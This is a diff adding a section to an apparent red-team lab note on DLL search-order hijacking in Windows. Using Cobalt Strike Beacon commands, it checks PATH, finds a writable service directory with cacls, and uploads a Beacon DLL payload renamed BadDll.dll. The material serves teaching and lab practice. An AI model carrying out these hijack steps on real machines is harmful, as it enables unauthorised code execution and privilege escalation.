@@ -33,3 +33,38 @@ beacon> ls C:\Program Files\Bad Windows Service\Service Executable
  ----     ----    -------------         ----
  9kb      fil     01/06/2025 16:10:12   BadWindowsService.exe
 ```
+
+So where is this being loaded from?  A review of the path environment variable shows that `C:\Program Files\Bad Windows Service` has been appended to the system path variable.
+
+```powershell
+beacon> env
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Bad Windows Service;C:\Users\kbowles\AppData\Local\Microsoft\WindowsApps
+```
+
+Listing this directory shows this is where BadDll.dll exists.
+
+```powershell
+beacon> ls C:\Program Files\Bad Windows Service
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/06/2025 16:12:31   Service Executable
+ 10kb     fil     01/06/2025 16:10:12   BadDll.dll
+```
+
+Based on the search order outlined above, where could an adversary potentially hijack this DLL?  The executing directory is a possibility _if_ the directory is writable.  In this scenario, it is.
+
+```powershell
+beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
+C:\Program Files\Bad Windows Service\Service Executable NT AUTHORITY\Authenticated Users:(CI)(OI)F
+```
+
+To perform the hijack, simply upload a Beacon DLL payload into this directory, and call it `BadDll.dll`.
+
+```powershell
+beacon> cd C:\Program Files\Bad Windows Service\Service Executable
+beacon> upload C:\Payloads\dns_x64.dll
+beacon> mv dns_x64.dll BadDll.dll
+```
+
+![[Pasted image 20250707103948.png]]
